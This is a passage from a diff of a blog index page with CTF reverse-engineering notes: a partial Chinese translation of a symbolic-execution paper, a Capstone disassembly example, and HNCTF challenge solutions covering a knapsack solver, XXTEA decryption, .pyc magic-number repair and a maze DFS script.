@@ -144,6 +144,860 @@
             
 
 <div class="post">
+    <a href="/2022/11/07/TranslationofSymbolicExecutionforSoftwareTesting-ThreeDecadesLater/">
+        <h2>
+            'TranslationofSymbolicExecutionforSoftwareTesting:ThreeDecadesLater'
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/11/7
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <ul>
+<li><a href="#1.1">1.前言</a></li>
+<li><a href="#2.0">符号执行（应用于软件测试）</a><ul>
+<li><a href="#2.1">梗概(Abstract)</a></li>
+<li><a href="#2.2">介绍(Introduction)</a></li>
+<li><a href="#2.3">简述传统动态执行(Overview of Classical Symbolic Execution)</a></li>
+<li><a href="#2.4">现代符号执行技术(Modern Symbolic Execution Techniques)</a></li>
+<li><a href="#2.5">符号执行遇到的关键挑战与一些解决方法(Key Challenges and Some Solutions)</a></li>
+<li><a href="#2.6">工具(Tools)</a></li>
+</ul>
+</li>
+<li><a href="#2.7">总结(Conclusion)</a></li>
+</ul>
+<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><div id="1.1">前言<div></div></div></h5><h5 id="特殊情况，中文写一下吧。最近正在学angr，简单渣翻一下符号执行的论文，过程中加深一下自己的理解吧，顺便有人需要的话可以看看（建议还是原文走一下呢，一些名词我也不知道怎么写。。。"><a href="#特殊情况，中文写一下吧。最近正在学angr，简单渣翻一下符号执行的论文，过程中加深一下自己的理解吧，顺便有人需要的话可以看看（建议还是原文走一下呢，一些名词我也不知道怎么写。。。" class="headerlink" title="特殊情况，中文写一下吧。最近正在学angr，简单渣翻一下符号执行的论文，过程中加深一下自己的理解吧，顺便有人需要的话可以看看（建议还是原文走一下呢，一些名词我也不知道怎么写。。。"></a>特殊情况，中文写一下吧。最近正在学<code>angr</code>，简单渣翻一下符号执行的论文，过程中加深一下自己的理解吧，顺便有人需要的话可以看看（建议还是<a target="_blank" rel="noopener" href="https://people.eecs.berkeley.edu/~ksen/papers/cacm13.pdf">原文</a>走一下呢，一些名词我也不知道怎么写。。。</h5><h3 id="符号执行（应用于软件测试）-Symbolic-Execution-for-Software-Testing-Three-Decades-Later"><a href="#符号执行（应用于软件测试）-Symbolic-Execution-for-Software-Testing-Three-Decades-Later" class="headerlink" title="符号执行（应用于软件测试）(Symbolic Execution for Software Testing: Three Decades Later)"></a><div id="2.0">符号执行（应用于软件测试）(Symbolic Execution for Software Testing: Three Decades Later)<div></div></div></h3><h4 id="梗概-Abstract"><a href="#梗概-Abstract" class="headerlink" title="梗概(Abstract)"></a><div id="2.1">梗概(Abstract)<div></div></div></h4><h5 id="符号执行由于在软件测试中能良好生成高覆盖能力的测试组件-不懂，high-coverage-test-suites-和寻找到复杂软件英译中较深的错误而受到了广泛关注。在本文中我们给出一个现代符号执行的概要，并探讨其遇到的关键挑战，包含了路径搜索、约束求解、内存模型分析，并探讨了其他几种已独立发表的解决方案。（分析优缺吧，看看符号执行为啥那么牛）"><a href="#符号执行由于在软件测试中能良好生成高覆盖能力的测试组件-不懂，high-coverage-test-suites-和寻找到复杂软件英译中较深的错误而受到了广泛关注。在本文中我们给出一个现代符号执行的概要，并探讨其遇到的关键挑战，包含了路径搜索、约束求解、内存模型分析，并探讨了其他几种已独立发表的解决方案。（分析优缺吧，看看符号执行为啥那么牛）" class="headerlink" title="符号执行由于在软件测试中能良好生成高覆盖能力的测试组件(不懂，high-coverage test suites)和寻找到复杂软件英译中较深的错误而受到了广泛关注。在本文中我们给出一个现代符号执行的概要，并探讨其遇到的关键挑战，包含了路径搜索、约束求解、内存模型分析，并探讨了其他几种已独立发表的解决方案。（分析优缺吧，看看符号执行为啥那么牛）"></a>符号执行由于在软件测试中能良好生成高覆盖能力的测试组件(不懂，high-coverage test suites)和寻找到复杂软件英译中较深的错误而受到了广泛关注。在本文中我们给出一个现代符号执行的概要，并探讨其遇到的关键挑战，包含了路径搜索、约束求解、内存模型分析，并探讨了其他几种已独立发表的解决方案。（分析优缺吧，看看符号执行为啥那么牛）</h5><h4 id="介绍-Introduction"><a href="#介绍-Introduction" class="headerlink" title="介绍(Introduction)"></a><div id="2.2">介绍(Introduction)<div></div></div></h4><h5 id="符号执行由于在软件测试中能良好生成高覆盖能力的测试组件和寻找到复杂软件英译中较深的错误而受到了广泛关注。（重复一遍。。。）虽然符号执行的基本概念在三十年以前已经被提出，由于约束求解的一个意义重大的发展，它最近才被实现"><a href="#符号执行由于在软件测试中能良好生成高覆盖能力的测试组件和寻找到复杂软件英译中较深的错误而受到了广泛关注。（重复一遍。。。）虽然符号执行的基本概念在三十年以前已经被提出，由于约束求解的一个意义重大的发展，它最近才被实现" class="headerlink" title="符号执行由于在软件测试中能良好生成高覆盖能力的测试组件和寻找到复杂软件英译中较深的错误而受到了广泛关注。（重复一遍。。。）虽然符号执行的基本概念在三十年以前已经被提出，由于约束求解的一个意义重大的发展，它最近才被实现"></a>符号执行由于在软件测试中能良好生成高覆盖能力的测试组件和寻找到复杂软件英译中较深的错误而受到了广泛关注。（重复一遍。。。）虽然符号执行的基本概念在三十年以前已经被提出，由于约束求解的一个意义重大的发展，它最近才被实现</h5><h4 id="简述传统动态执行-Overview-of-Classical-Symbolic-Execution"><a href="#简述传统动态执行-Overview-of-Classical-Symbolic-Execution" class="headerlink" title="简述传统动态执行(Overview of Classical Symbolic Execution)"></a><div id="2.3">简述传统动态执行(Overview of Classical Symbolic Execution)<div></div></div></h4><h4 id="现代符号执行技术-Modern-Symbolic-Execution-Techniques"><a href="#现代符号执行技术-Modern-Symbolic-Execution-Techniques" class="headerlink" title="现代符号执行技术(Modern Symbolic Execution Techniques)"></a><div id="2.4">现代符号执行技术(Modern Symbolic Execution Techniques)<div></div></div></h4><h4 id="符号执行遇到的关键挑战与一些解决方法-Key-Challenges-and-Some-Solutions"><a href="#符号执行遇到的关键挑战与一些解决方法-Key-Challenges-and-Some-Solutions" class="headerlink" title="符号执行遇到的关键挑战与一些解决方法(Key Challenges and Some Solutions)"></a><div id="2.5">符号执行遇到的关键挑战与一些解决方法(Key Challenges and Some Solutions)<div></div></div></h4><h4 id="工具-Tools"><a href="#工具-Tools" class="headerlink" title="工具(Tools)"></a><div id="2.6">工具(Tools)<div></div></div></h4><h4 id="总结-Conclusion"><a href="#总结-Conclusion" class="headerlink" title="总结(Conclusion)"></a><div id="2.7">总结(Conclusion)<div></div></div></h4><p>~To be continue</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/ctf/" style="color: #00a596">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/re/" style="color: #03a9f4">
+                re
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/tool/" style="color: #00bcd4">
+                tool
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/translation/" style="color: #ff7d73">
+                translation
+            </a>
+        </span>
+        
+    </div>
+    <a href="/2022/11/07/TranslationofSymbolicExecutionforSoftwareTesting-ThreeDecadesLater/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/11/07/Execution/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/11/7
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/11/07/Execution/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/11/06/capstone/">
+        <h2>
+            Capstone
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/11/6
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h6 id="Preface"><a href="#Preface" class="headerlink" title="Preface:"></a>Preface:</h6><h6 id="A-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-It’s-the-first-time-I-heard-of-it-so-I-am-writing-to-this-blog-for-later-review"><a href="#A-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-It’s-the-first-time-I-heard-of-it-so-I-am-writing-to-this-blog-for-later-review" class="headerlink" title="A write up in hnctf use capstone to solved the problem maze. It’s the first time I heard of it, so I am writing to this blog for later review."></a>A write up in hnctf use <code>capstone</code> to solved the problem <code>maze</code>. It’s the first time I heard of it, so I am writing to this blog for later review.</h6><h5 id="Most-thing-I-write-can-be-found-in-Official-file"><a href="#Most-thing-I-write-can-be-found-in-Official-file" class="headerlink" title="Most thing I write can be found in Official file."></a>Most thing I write can be found in <a target="_blank" rel="noopener" href="http://www.capstone-engine.org/lang_python.html">Official file</a>.</h5><h5 id="An-example-you-can-try-before-reading"><a href="#An-example-you-can-try-before-reading" class="headerlink" title="An example you can try before reading:"></a>An example you can try before reading:</h5><pre><code># test1.py
+from capstone import *
+
+CODE = b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;
+
+md = Cs(CS_ARCH_X86, CS_MODE_64)
+for i in md.disasm(CODE, 0x1000):
+    print(&quot;0x%x:\t%s\t%s&quot; %(i.address, i.mnemonic, i.op_str))
+
+# It&#39;s the official example, you can try to change the CODE and see what happens.(Such as add a few &#39;\x55&#39; or &#39;\x48&#39; or whatever you like)
+</code></pre>
+<h5 id="Trying-this-problem-you-get-the-basic-idea-how-capstone-or-rather-how-a-exe-file-works-It-translate-the-binary-numbers-into-assembly-language-in-a-queue-and-when-you-add-some-thing-the-whole-procedure-might-when-wrong-You-may-think-thit-is-simple-but-some-time-we-just-didn’t-remember-to-relate-the-whole-file-with-simple-binary-numbers-like-wht-upper-CODE"><a href="#Trying-this-problem-you-get-the-basic-idea-how-capstone-or-rather-how-a-exe-file-works-It-translate-the-binary-numbers-into-assembly-language-in-a-queue-and-when-you-add-some-thing-the-whole-procedure-might-when-wrong-You-may-think-thit-is-simple-but-some-time-we-just-didn’t-remember-to-relate-the-whole-file-with-simple-binary-numbers-like-wht-upper-CODE" class="headerlink" title="Trying this problem, you get the basic idea how capstone, or rather, how a .exe file works. It translate the binary numbers into assembly language in a queue, and when you add some thing, the whole procedure might when wrong.(You may think thit is simple, but some time we just didn’t remember to relate the whole file with simple binary numbers like wht upper CODE)"></a>Trying this problem, you get the basic idea how capstone, or rather, how a <code>.exe</code> file works. It translate the binary numbers into assembly language in a queue, and when you add some thing, the whole procedure might when wrong.(You may think thit is simple, but some time we just didn’t remember to relate the whole file with simple binary numbers like wht upper <code>CODE</code>)</h5><h5 id="We-need-to-know-what-does-the-function-mean"><a href="#We-need-to-know-what-does-the-function-mean" class="headerlink" title="We need to know what does the function mean:"></a>We need to know what does the function mean:</h5><p>~to be continue</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/ctf/" style="color: #00a596">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/re/" style="color: #00bcd4">
+                re
+            </a>
+        </span>
+        
+    </div>
+    <a href="/2022/11/06/capstone/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/11/04/hnctfCry/">
+        <h2>
+            hnctfCry
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/11/4
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/ctf/" style="color: #03a9f4">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/crypto/" style="color: #00a596">
+                crypto
+            </a>
+        </span>
+        
+    </div>
+    <a href="/2022/11/04/hnctfCry/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/11/02/hnctfRe/">
+        <h2>
+            hnctfRe
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/11/2
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h6 id="Some-reverse-questions-I-didn’t-have-time-to-solve-Or-didn’t-solve-out…"><a href="#Some-reverse-questions-I-didn’t-have-time-to-solve-Or-didn’t-solve-out…" class="headerlink" title="Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)"></a>Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)</h6><h3 id="Help-Me"><a href="#Help-Me" class="headerlink" title="Help_Me!"></a>Help_Me!</h3><h5 id="My-exp"><a href="#My-exp" class="headerlink" title="My exp:"></a>My exp:</h5><pre><code>#include&lt;bits/stdc++.h&gt;
+using namespace std;
+int v12[1000]=&#123;0&#125;;
+int v13[1000]=&#123;0&#125;;
+long long maxn;
+int v[1000];
+void dfs(int cns,int n,int num,long long sum)&#123;
+    if (num&gt;200 || n==20)
+    &#123;
+        if (n!=20)
+        sum-=v12[n];
+        cns--;
+        if (sum&gt;=maxn)&#123;
+            maxn=sum;
+            cout&lt;&lt;&quot;sum  =  &quot;&lt;&lt;sum&lt;&lt;&quot;    :  &quot;&lt;&lt;&quot;cns=&quot;&lt;&lt;cns&lt;&lt;&quot;   &quot;;
+            for (int i=0;i&lt;cns;i++)&#123;
+                cout&lt;&lt;v[i]&lt;&lt;&quot; &quot;;
+            &#125;
+            cout&lt;&lt;endl;
+        &#125;
+        return ;
+    &#125;
+    
+    for (int i=n+1;i&lt;=20;i++)&#123;
+        v[cns]=i;
+        
+        dfs(cns+1,i,num+v13[i],sum+v12[i]);
+    &#125;
+&#125;
+
+
+int main()&#123;
+    
+    v12[0] = 26;
+    v12[1] = 59;
+    v12[2] = 30;
+    v12[3] = 19;
+    v12[4] = 66;
+    v12[5] = 85;
+    v12[6] = 94;
+    v12[7] = 8;
+    v12[8] = 3;
+    v12[9] = 44;
+    v12[20] = 1000;
+    v12[10] = 5;
+    v12[11] = 1;
+    v12[12] = 41;
+    v12[13] = 82;
+    v12[14] = 76;
+    v12[15] = 1;
+    v12[16] = 12;
+    v12[17] = 81;
+    v12[18] = 73;
+    v12[19] = 32;
+    v12[20]=1;
+    v13[0] = 71;
+    v13[1] = 34;
+    v13[20] = 1000;
+    v13[2] = 82;
+    v13[3] = 23;
+    v13[4] = 1;
+    v13[5] = 88;
+    v13[6] = 12;
+    v13[7] = 57;
+    v13[8] = 10;
+    v13[9] = 68;
+    v13[10] = 5;
+    v13[11] = 33;
+    v13[12] = 37;
+    v13[13] = 69;
+    v13[14] = 98;
+    v13[15] = 24;
+    v13[16] = 26;
+    v13[17] = 83;
+    v13[18] = 16;
+    v13[19] = 26;
+    v13[20]=1;
+    maxn=0;
+    dfs(0,-1,0,1);
+&#125;
+</code></pre>
+<h5 id="Official-exp"><a href="#Official-exp" class="headerlink" title="Official exp:"></a>Official exp:</h5><pre><code>#include &quot;iostream&quot;
+#include &quot;stdio.h&quot;
+using namespace std;
+int val[50]=&#123;26, 59, 30, 19, 66, 85, 94, 8, 3, 44, 5, 1, 41, 82, 76, 1,    12,    81,    73,    32&#125;,
+w[50]=&#123;71, 34, 82, 23, 1,88,12,57, 10, 68, 5, 33,    37,    69,    98,    24, 26,    83, 16, 26&#125;;
+int dp[21][301];
+int main()
+&#123;
+    int t=200;
+    int m = 20;
+    for(int i=1;i&lt;=m;i++) 
+        for(int j=t;j&gt;=0;j--)  
+    &#123;
+        if(j&gt;=w[i])//容量可以放 
+        &#123;
+            int tmp;
+            dp[i][j]=max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
+        &#125;  
+        else
+        &#123;
+            dp[i][j]=dp[i-1][j];
+        &#125;              
+    &#125;
+    //dp[i][j] = max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
+    int x = 20;
+    int y = 200;
+    while(x!=0)
+    &#123;
+        if(dp[x-1][y-w[x]]+val[x] &gt; dp[x-1][y])        
+        &#123;
+            printf(&quot;%d,&quot;,x); 
+            y-=w[x];
+        &#125;
+        x-=1;
+    &#125;
+    return 0;
+&#125;
+</code></pre>
+<h5 id="A-0-1-bag-problem-And-notice-that-you-should-ADD-v12-not-MULTIPLY-like-in-the-ida……"><a href="#A-0-1-bag-problem-And-notice-that-you-should-ADD-v12-not-MULTIPLY-like-in-the-ida……" class="headerlink" title="A 0-1 bag problem. And notice that you should ADD v12, not MULTIPLY, like in the ida……"></a>A 0-1 bag problem. And notice that you should <c style="color: #FF0000;">ADD</c> v12, not MULTIPLY, like in the ida……</h5><h3 id="CM2"><a href="#CM2" class="headerlink" title="CM2"></a>CM2</h3><h6 id="Don’t-understand-how-to-debug-to-find-the-place…-Though-by-guessing-I-work-it-out-anyway"><a href="#Don’t-understand-how-to-debug-to-find-the-place…-Though-by-guessing-I-work-it-out-anyway" class="headerlink" title="Don’t understand how to debug to find the place… Though by guessing I work it out anyway."></a>Don’t understand how to debug to find the place… Though by guessing I work it out anyway.</h6><h5 id="Officail-wp"><a href="#Officail-wp" class="headerlink" title="Officail wp:"></a>Officail wp:</h5><p><img src="/2022/11/02/hnctfRe/cm2.png" alt="cm2"></p>
+<h3 id="Try2debugPlusPlus"><a href="#Try2debugPlusPlus" class="headerlink" title="Try2debugPlusPlus"></a>Try2debugPlusPlus</h3><h5 id="Nop-the-IsDebuggerPresent-noticed-that-there-are-two-of-them-and-get-the-key-remember-to-set-breakpoint-after-printf"><a href="#Nop-the-IsDebuggerPresent-noticed-that-there-are-two-of-them-and-get-the-key-remember-to-set-breakpoint-after-printf" class="headerlink" title="Nop the IsDebuggerPresent()(noticed that there are two of them) and get the key(remember to set breakpoint after printf()):"></a>Nop the <code>IsDebuggerPresent()</code>(noticed that there are two of them) and get the key(remember to set breakpoint after <code>printf()</code>):</h5><p><img src="/2022/11/02/hnctfRe/debug2_1.png" alt="debug2_1"></p>
+<h5 id="Though-is-easy-for-us-to-decrypt-the-tea-encrypt-question-setter-seems-to-have-forgotten-something…"><a href="#Though-is-easy-for-us-to-decrypt-the-tea-encrypt-question-setter-seems-to-have-forgotten-something…" class="headerlink" title="Though is easy for us to decrypt the tea_encrypt, question setter seems to have forgotten something…"></a>Though is easy for us to decrypt the tea_encrypt, question setter seems to have forgotten something…</h5><p><img src="/2022/11/02/hnctfRe/debug2_2.png" alt="debug2_2"></p>
+<h3 id="What-1in-D11"><a href="#What-1in-D11" class="headerlink" title="What_1in_D11"></a>What_1in_D11</h3><h5 id="Repair-the-upx’s-features-easy-in-this-problem-to-study-more-you-can-refer-to-this-blog"><a href="#Repair-the-upx’s-features-easy-in-this-problem-to-study-more-you-can-refer-to-this-blog" class="headerlink" title="Repair the upx’s features(easy in this problem, to study more you can refer to this blog)"></a>Repair the upx’s features(easy in this problem, to study more you can refer to <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-326995-1-1.html">this blog</a>)</h5><h5 id="And-upx-d-to-unpacked-the-dll-check-it-in-ida-we-got"><a href="#And-upx-d-to-unpacked-the-dll-check-it-in-ida-we-got" class="headerlink" title="And upx -d to unpacked the .dll, check it in ida, we got:"></a>And <code>upx -d</code> to unpacked the .dll, check it in ida, we got:</h5><p><img src="/2022/11/02/hnctfRe/dll_1.png" alt="dll"></p>
+<h5 id="Official-writeup"><a href="#Official-writeup" class="headerlink" title="Official writeup:"></a>Official writeup:</h5><h6 id="A-btea-encrypt-which-I-am-not-fimilar-with-yet-Shall-get-more-study-about-encryption-and-decryption-later"><a href="#A-btea-encrypt-which-I-am-not-fimilar-with-yet-Shall-get-more-study-about-encryption-and-decryption-later" class="headerlink" title="(A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)"></a>(A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)</h6><pre><code>#include &lt;stdio.h&gt;  
+#include &lt;stdint.h&gt;  
+#define DELTA 0x9e3779b9  
+#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  
+void btea(uint32_t *v, int n, uint32_t const key[4])  
+&#123;  
+    uint32_t y, z, sum;  
+    unsigned p, rounds, e;  
+    if (n &gt; 1)            /* Coding Part */  
+    &#123;  
+        rounds = 6 + 52/n;  
+        sum = 0;  
+        z = v[n-1];  
+        do  
+        &#123;  
+            sum += DELTA;  
+            e = (sum &gt;&gt; 2) &amp; 3;  
+            for (p=0; p&lt;n-1; p++)  
+            &#123;  
+                y = v[p+1];  
+                z = v[p] += MX;  
+            &#125;  
+            y = v[0];  
+            z = v[n-1] += MX;  
+        &#125;  
+        while (--rounds);  
+    &#125;  
+    else if (n &lt; -1)      /* Decoding Part */  
+    &#123;  
+        n = -n;  
+        rounds = 6 + 52/n;  
+        sum = rounds*DELTA;  
+        y = v[0];  
+        do  
+        &#123;  
+            e = (sum &gt;&gt; 2) &amp; 3;  
+            for (p=n-1; p&gt;0; p--)  
+            &#123;  
+                z = v[p-1];  
+                y = v[p] -= MX;  
+            &#125;  
+            z = v[n-1];  
+            y = v[0] -= MX;  
+            sum -= DELTA;  
+        &#125;  
+        while (--rounds);  
+    &#125;  
+&#125;  
+int main()  
+&#123;  
+    unsigned int enc[8]=&#123;0x22a577c1,0x1c12c03,0xc74c3ebd,0xa9d03c85,0xadb8ffb3&#125;;
+    uint32_t const k[4]= &#123;55,66,77,88&#125;;  
+    int n= 5; //n的绝对值表示v的长度，取正表示加密，取负表示解密  
+    // v为要加密的数据是两个32位无符号整数  
+    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
+    btea(enc, -n, k);  
+    for(int i=0;i&lt;5;i++)
+    &#123;
+            printf(&quot;%x&quot;,enc[i]);
+        &#125;
+    return 0;  
+&#125;  
+</code></pre>
+<h3 id="Mazes"><a href="#Mazes" class="headerlink" title="Mazes"></a>Mazes</h3><h6 id="A-bit-complex-wait-until-later…"><a href="#A-bit-complex-wait-until-later…" class="headerlink" title="A bit complex, wait until later…"></a>A bit complex, wait until later…</h6><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><h6 id="Never-seen-before-later…"><a href="#Never-seen-before-later…" class="headerlink" title="Never seen before, later…"></a>Never seen before, later…</h6><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><h5 id="We-get-a-exe-file-from-its’-icon-we-know-that-we-should-uncompile-it-to-pyc-with-pyinstxtractor"><a href="#We-get-a-exe-file-from-its’-icon-we-know-that-we-should-uncompile-it-to-pyc-with-pyinstxtractor" class="headerlink" title="We get a .exe file, from its’ icon we know that we should uncompile it to .pyc with pyinstxtractor"></a>We get a .exe file, from its’ icon we know that we should uncompile it to .pyc with <code>pyinstxtractor</code></h5><p><img src="/2022/11/02/hnctfRe/ez_maze_1.png" alt="ez_maze"></p>
+<h5 id="Then-we-got-a-package-extracted"><a href="#Then-we-got-a-package-extracted" class="headerlink" title="Then, we got a package _extracted:"></a>Then, we got a package <code>_extracted</code>:</h5><h6 id="complex-it-is…"><a href="#complex-it-is…" class="headerlink" title="complex it is…"></a>complex it is…</h6><p><img src="/2022/11/02/hnctfRe/extracted.png" alt="extracted"></p>
+<h5 id="Find-a-file-named-maze-without-a-suffix-one-Change-its-suffix-into-pyc-and-Try-compyle6-o-maze-py-maze-pyc-it-went-wrong"><a href="#Find-a-file-named-maze-without-a-suffix-one-Change-its-suffix-into-pyc-and-Try-compyle6-o-maze-py-maze-pyc-it-went-wrong" class="headerlink" title="Find a file named maze (without a suffix one!) Change its suffix into .pyc and Try compyle6 -o maze.py maze.pyc, it went wrong:"></a>Find a file named <code>maze</code> (without a suffix one!) Change its suffix into <code>.pyc</code> and Try <code>compyle6 -o maze.py maze.pyc</code>, it went wrong:</h5><p><img src="/2022/11/02/hnctfRe/uncompyle6.png" alt="compyle6"></p>
+<h5 id="That’s-when-you-find-out-that-pyinstxtractor-didn’t-fix-your-pyc-file’s-magic-number"><a href="#That’s-when-you-find-out-that-pyinstxtractor-didn’t-fix-your-pyc-file’s-magic-number" class="headerlink" title="That’s when you find out that pyinstxtractor didn’t fix your .pyc file’s magic number."></a>That’s when you find out that pyinstxtractor didn’t fix your .pyc file’s magic number.</h5><p><img src="/2022/11/02/hnctfRe/cmakeInstall.png" alt="cmake"></p>
+<h5 id="The-link-problem-setter-gives-you-which-does-no-help-at-all…The-magic-number-of-the-file-struct-is-destroy-as-well…"><a href="#The-link-problem-setter-gives-you-which-does-no-help-at-all…The-magic-number-of-the-file-struct-is-destroy-as-well…" class="headerlink" title="The link problem setter gives you, which does no help at all…The magic number of the file struct is destroy as well…"></a><a target="_blank" rel="noopener" href="https://www.jb51.net/article/231188.htm">The link problem setter gives you</a>, which does no help at all…The <code>magic number</code> of the file <code>struct</code> is destroy as well…</h5><p><img src="/2022/11/02/hnctfRe/magicNumber_1.jpg" alt="magicNumber_1"></p>
+<h5 id="I-been-trying-tools-like-uncompyle6-which-does-not-support-python-3-10-and-install-python-3-9-does-not-help-at-all-Later-I-should-look-into-this-problem-and-try-to-solved-it…-and-pycdc-which-is-said-to-support-high-edition-but-can-not-identify-the-magic-number-as-well-However-when-I-tried-to-add-some-magic-number-from-other-python-edition-Python-3-8b2-if-I-remember-it-right-and-put-it-in-an-online-uncompiler-It-just-worked…"><a href="#I-been-trying-tools-like-uncompyle6-which-does-not-support-python-3-10-and-install-python-3-9-does-not-help-at-all-Later-I-should-look-into-this-problem-and-try-to-solved-it…-and-pycdc-which-is-said-to-support-high-edition-but-can-not-identify-the-magic-number-as-well-However-when-I-tried-to-add-some-magic-number-from-other-python-edition-Python-3-8b2-if-I-remember-it-right-and-put-it-in-an-online-uncompiler-It-just-worked…" class="headerlink" title="I been trying tools like uncompyle6(which does not support python 3.10, and install python 3.9 does not help at all. Later I should look into this problem and try to solved it…)  and pycdc(which is said to support high edition, but can not identify the magic number as well) However, when I tried to add some magic number from other python edition(Python 3.8b2, if I remember it right), and put it in an online uncompiler. It just worked…"></a>I been trying tools like <code>uncompyle6</code>(which does not support python 3.10, and install python 3.9 does not help at all. Later I should look into this problem and try to solved it…)  and <code>pycdc</code>(which is said to support high edition, but can not identify the magic number as well) However, when I tried to add some magic number from other python edition(Python 3.8b2, if I remember it right), and put it in an <a target="_blank" rel="noopener" href="https://tool.lu/pyc/">online uncompiler</a>. It just worked…</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Here-is-SG/p/15885799.html">a blog from my classmate that may help(though I do not really think so…)</a></p>
+</blockquote>
+<h5 id="some-magic-number"><a href="#some-magic-number" class="headerlink" title="some magic number:"></a>some magic number:</h5><pre><code>enum PycMagic &#123;
+    MAGIC_1_0 = 0x00999902,
+    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */
+    MAGIC_1_3 = 0x0A0D2E89,
+    MAGIC_1_4 = 0x0A0D1704,
+    MAGIC_1_5 = 0x0A0D4E99,
+    MAGIC_1_6 = 0x0A0DC4FC,
+
+    MAGIC_2_0 = 0x0A0DC687,
+    MAGIC_2_1 = 0x0A0DEB2A,
+    MAGIC_2_2 = 0x0A0DED2D,
+    MAGIC_2_3 = 0x0A0DF23B,
+    MAGIC_2_4 = 0x0A0DF26D,
+    MAGIC_2_5 = 0x0A0DF2B3,
+    MAGIC_2_6 = 0x0A0DF2D1,
+    MAGIC_2_7 = 0x0A0DF303,
+
+    MAGIC_3_0 = 0x0A0D0C3A,
+    MAGIC_3_1 = 0x0A0D0C4E,
+    MAGIC_3_2 = 0x0A0D0C6C,
+    MAGIC_3_3 = 0x0A0D0C9E,
+    MAGIC_3_4 = 0x0A0D0CEE,
+    MAGIC_3_5 = 0x0A0D0D16,
+    MAGIC_3_5_3 = 0x0A0D0D17,
+    MAGIC_3_6 = 0x0A0D0D33,
+    MAGIC_3_7 = 0x0A0D0D42,
+    MAGIC_3_8 = 0x0A0D0D55,
+    MAGIC_3_9 = 0x0A0D0D61,
+&#125;;
+</code></pre>
+<h5 id="uncompyle-to-long-the-maze-is-I-didn’t-put-it-here"><a href="#uncompyle-to-long-the-maze-is-I-didn’t-put-it-here" class="headerlink" title="uncompyle:(to long the maze is, I didn’t put it here)"></a>uncompyle:(to long the maze is, I didn’t put it here)</h5><p><img src="/2022/11/02/hnctfRe/uncompyle.jpg" alt="uncompyle"></p>
+<h5 id="Dfs-script-From-official-wp"><a href="#Dfs-script-From-official-wp" class="headerlink" title="Dfs script(From official wp):"></a>Dfs script(From official wp):</h5><pre><code>map1=[...]
+map2 =  [[0 for i in range(len(map1))] for i in range(len(map1)) ]
+flag=&quot;&quot;
+def DFS(x,y):
+    global flag
+    if x == len(map1) - 2 and y == len(map1) - 2: #判断边界
+        print(flag)
+    if map1[x+1][y] == 0 and map2[x+1][y] == 0:
+        map2[x][y] = 1
+        flag += &#39;s&#39;
+        DFS(x+1,y)
+        flag = flag[:-1]
+        map2[x][y] = 0
